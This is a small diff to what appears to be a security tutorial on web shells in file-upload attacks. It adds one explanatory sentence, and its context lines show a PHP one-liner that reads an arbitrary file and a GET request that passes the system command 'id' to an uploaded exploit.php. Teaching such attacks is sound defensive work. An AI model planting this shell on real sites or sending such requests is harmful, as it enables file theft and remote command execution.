@@ -23,6 +23,7 @@ A web shell is a malicious script that enables an attacker to execute arbitrary 
 ```php
 <?php echo file_get_contents('/path/to/target/file'); ?>
 ```
+ Once uploaded, sending a request for this malicious file will return the target file's contents in the response. 
 
 #### Example to execute a command
 
@@ -31,6 +32,6 @@ A web shell is a malicious script that enables an attacker to execute arbitrary 
 ```
  This script enables you to pass an arbitrary system command via a query parameter as follows: 
  
- ```html
+ ```
 GET /example/exploit.php?command=id HTTP/1.1
 ```
